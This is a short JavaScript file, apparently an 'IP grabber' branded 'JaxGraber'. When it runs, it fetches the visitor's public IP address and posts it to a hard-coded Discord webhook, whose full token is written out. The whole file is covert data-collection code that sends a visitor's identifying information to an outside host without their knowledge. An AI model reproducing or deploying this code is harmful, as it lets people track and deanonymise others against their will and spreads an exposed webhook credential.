// Grab the ip and send it to https://discord.com/api/webhooks/1157032692966236411/Tv1v7ommYqF8qQyB-didmQMCwVyTA0a09ZrdrqObFpN5V4RjzFqlZsleQFgeAeXCAXut webhook

function getIP(callback) {
    var request = new XMLHttpRequest();
    request.open("GET", "https://api.ipify.org?format=jsonp&callback=getIP");
    request.send();
    request.onload = () => {
        if (request.status === 200) {
            console.log(request.response);
            var data = request.response;
            console.log(data);
            callback(data);
        }
    };
}

var request = new XMLHttpRequest();
request.open("POST", "https://discord.com/api/webhooks/1157032692966236411/Tv1v7ommYqF8qQyB-didmQMCwVyTA0a09ZrdrqObFpN5V4RjzFqlZsleQFgeAeXCAXut");

request.setRequestHeader('Content-type', 'application/json');
getIP((data) => {
    var t = {
        username: "JaxHax",
        avatar_url: "https://cdn.discordapp.com/attachments/1120133954943590471/1141601015066538015/Jaxfry_1.png",
        content: "",
        embeds: [{
            color: "4700374",
            title: "JaxGraber",
            fields: [
                {name: "IP", value: data.ip},
            ],
        }]
    };
    request.send(JSON.stringify(t));
});